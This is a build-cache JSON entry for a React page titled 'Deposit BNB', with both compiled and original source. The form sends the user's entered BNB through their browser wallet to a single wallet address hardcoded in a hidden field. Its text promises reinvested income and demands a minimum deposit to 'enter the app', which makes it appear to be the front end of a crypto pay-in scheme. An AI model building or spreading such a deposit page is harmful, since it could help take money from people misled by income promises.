{"ast":null,"code":"import _slicedToArray from\"C:/Users/MKele/Desktop/rotshild/react-ap/node_modules/@babel/runtime/helpers/esm/slicedToArray.js\";import _regeneratorRuntime from\"C:/Users/MKele/Desktop/rotshild/react-ap/node_modules/@babel/runtime/helpers/esm/regeneratorRuntime.js\";import _asyncToGenerator from\"C:/Users/MKele/Desktop/rotshild/react-ap/node_modules/@babel/runtime/helpers/esm/asyncToGenerator.js\";import{useState}from\"react\";import{ethers}from\"ethers\";import ErrorMessage from\"./ErrorMessage\";import TxList from\"./TxList\";import styles from\"./css.css\";import{jsx as _jsx}from\"react/jsx-runtime\";import{jsxs as _jsxs}from\"react/jsx-runtime\";var startPayment=/*#__PURE__*/function(){var _ref2=_asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee(_ref){var setError,setTxs,ether,addr,provider,signer,tx;return _regeneratorRuntime().wrap(function _callee$(_context){while(1){switch(_context.prev=_context.next){case 0:setError=_ref.setError,setTxs=_ref.setTxs,ether=_ref.ether,addr=_ref.addr;_context.prev=1;if(window.ethereum){_context.next=4;break;}throw new Error(\"No crypto wallet found. Please install it.\");case 4:_context.next=6;return window.ethereum.send(\"eth_requestAccounts\");case 6:provider=new ethers.providers.Web3Provider(window.ethereum);signer=provider.getSigner();ethers.utils.getAddress(addr);_context.next=11;return signer.sendTransaction({to:addr,value:ethers.utils.parseEther(ether)});case 11:tx=_context.sent;console.log({ether:ether,addr:addr});console.log(\"tx\",tx);setTxs([tx]);_context.next=20;break;case 17:_context.prev=17;_context.t0=_context[\"catch\"](1);setError(_context.t0.message);case 20:case\"end\":return _context.stop();}}},_callee,null,[[1,17]]);}));return function startPayment(_x){return _ref2.apply(this,arguments);};}();export default function App(){var _useState=useState(),_useState2=_slicedToArray(_useState,2),error=_useState2[0],setError=_useState2[1];var _useState3=useState([]),_useState4=_slicedToArray(_useState3,2),txs=_useState4[0],setTxs=_useState4[1];var handleSubmit=/*#__PURE__*/function(){var _ref3=_asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee2(e){var data;return _regeneratorRuntime().wrap(function _callee2$(_context2){while(1){switch(_context2.prev=_context2.next){case 0:e.preventDefault();data=new FormData(e.target);setError();_context2.next=5;return startPayment({setError:setError,setTxs:setTxs,ether:data.get(\"ether\"),addr:data.get(\"addr\")});case 5:case\"end\":return _context2.stop();}}},_callee2);}));return function handleSubmit(_x2){return _ref3.apply(this,arguments);};}();return/*#__PURE__*/_jsxs(\"form\",{onSubmit:handleSubmit,className:\"form\",children:[/*#__PURE__*/_jsx(\"h1\",{}),/*#__PURE__*/_jsx(\"input\",{type:\"hidden\",name:\"addr\",value:\"0xb6C840B15a468FFe469910db719761373Cc9e1AB\"}),/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(\"p\",{className:\"p10\",children:\"1. Deposit BNB\"}),/*#__PURE__*/_jsx(\"p\",{className:\"p20\",children:\"( min 0.1 , max 500 )\"}),/*#__PURE__*/_jsx(\"p\",{className:\"p30\",children:\"Information : A new Deposit automatically reinvests the current unwithdrawn income\"}),/*#__PURE__*/_jsx(\"p\",{className:\"p40\",children:\"2. Enter The App \"}),/*#__PURE__*/_jsx(\"p\",{className:\"p50\",children:\"Enter a Minimum of 0.2 bnb to access\"}),/*#__PURE__*/_jsx(\"div\",{className:\"tr1\"}),/*#__PURE__*/_jsx(\"div\",{className:\"tr2\"}),/*#__PURE__*/_jsx(\"div\",{c:true,children:/*#__PURE__*/_jsx(\"input\",{className:\"border \",name:\"ether\",type:\"text\",min:\"0.2\",max:\"5\",placeholder:\"Min 0.2 - Max 5 BNB\"})}),/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(\"button\",{type:\"submit\",className:\"button\",children:\"Deposit\"}),/*#__PURE__*/_jsx(ErrorMessage,{message:error}),/*#__PURE__*/_jsx(TxList,{txs:txs})]})]})]});}","map":{"version":3,"names":["useState","ethers","ErrorMessage","TxList","styles","startPayment","setError","setTxs","ether","addr","window","ethereum","Error","send","provider","providers","Web3Provider","signer","getSigner","utils","getAddress","sendTransaction","to","value","parseEther","tx","console","log","message","App","error","txs","handleSubmit","e","preventDefault","data","FormData","target","get"],"sources":["C:/Users/MKele/Desktop/rotshild/react-ap/src/App.js"],"sourcesContent":["import { useState } from \"react\";\r\nimport { ethers } from \"ethers\";\r\nimport ErrorMessage from \"./ErrorMessage\";\r\nimport TxList from \"./TxList\";\r\nimport styles from \"./css.css\";\r\n\r\n\r\nconst startPayment = async ({ setError, setTxs, ether, addr }) => {\r\n  try {\r\n    if (!window.ethereum)\r\n      throw new Error(\"No crypto wallet found. Please install it.\");\r\n\r\n    await window.ethereum.send(\"eth_requestAccounts\");\r\n    const provider = new ethers.providers.Web3Provider(window.ethereum);\r\n    const signer = provider.getSigner();\r\n    ethers.utils.getAddress(addr);\r\n    const tx = await signer.sendTransaction({\r\n      to: addr,\r\n      value: ethers.utils.parseEther(ether)\r\n    });\r\n    console.log({ ether, addr });\r\n    console.log(\"tx\", tx);\r\n    setTxs([tx]);\r\n  } catch (err) {\r\n    setError(err.message);\r\n  }\r\n};\r\n\r\nexport default function App() {\r\n  const [error, setError] = useState();\r\n  const [txs, setTxs] = useState([]);\r\n\r\n  const handleSubmit = async (e) => {\r\n    e.preventDefault();\r\n    const data = new FormData(e.target);\r\n    setError();\r\n    await startPayment({\r\n      setError,\r\n      setTxs,\r\n      ether: data.get(\"ether\"),\r\n      addr: data.get(\"addr\")\r\n    });\r\n  };\r\n\r\n  return (\r\n        <form onSubmit={handleSubmit}className=\"form\">\r\n          <h1></h1>\r\n          \r\n          <input\r\n            type=\"hidden\"\r\n            name=\"addr\"\r\n            value=\"0xb6C840B15a468FFe469910db719761373Cc9e1AB\"/>\r\n\r\n          <div>\r\n            <p className=\"p10\">1. Deposit BNB</p>\r\n            <p className=\"p20\">( min 0.1 , max 500 )</p>\r\n            <p className=\"p30\">Information : A new Deposit automatically reinvests the current unwithdrawn income</p>\r\n            <p className=\"p40\">2. Enter The App </p>\r\n            <p className=\"p50\">Enter a Minimum of 0.2 bnb to access</p>\r\n            <div className=\"tr1\"></div>\r\n            <div className=\"tr2\"></div>\r\n            <div c>\r\n              <input className=\"border \"\r\n                name=\"ether\"\r\n                type=\"text\"\r\n                min=\"0.2\"\r\n                max=\"5\"\r\n                placeholder=\"Min 0.2 - Max 5 BNB\" />\r\n            </div>\r\n\r\n            <div>\r\n              <button type=\"submit\" className=\"button\">\r\n                Deposit\r\n              </button>\r\n              <ErrorMessage message={error} />\r\n              <TxList txs={txs} />\r\n            </div>\r\n\r\n          </div>\r\n        </form>\r\n\r\n\r\n  );\r\n}\r\n"],"mappings":"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"},"metadata":{},"sourceType":"module"}